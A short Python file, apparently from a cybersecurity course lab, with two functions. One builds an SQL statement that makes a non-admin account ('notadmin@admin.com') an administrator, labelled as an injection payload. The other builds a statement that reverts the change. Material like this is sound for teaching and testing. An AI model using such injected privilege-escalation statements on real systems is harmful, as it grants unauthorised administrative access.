from uuid import uuid4
from datetime import datetime


def sql_injection_query():
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return f'INSERT INTO cybercourse.admin_users (id, date_created, date_modified, user_id) SELECT "{uuid4()}", "{now}", "{now}", id FROM auth_user WHERE email="notadmin@admin.com" LIMIT 1;'


def sql_inject_revert():
    return f'DELETE FROM cybercourse.admin_users WHERE user_id = (SELECT id FROM cybercourse.auth_user WHERE email="notadmin@admin.com");'
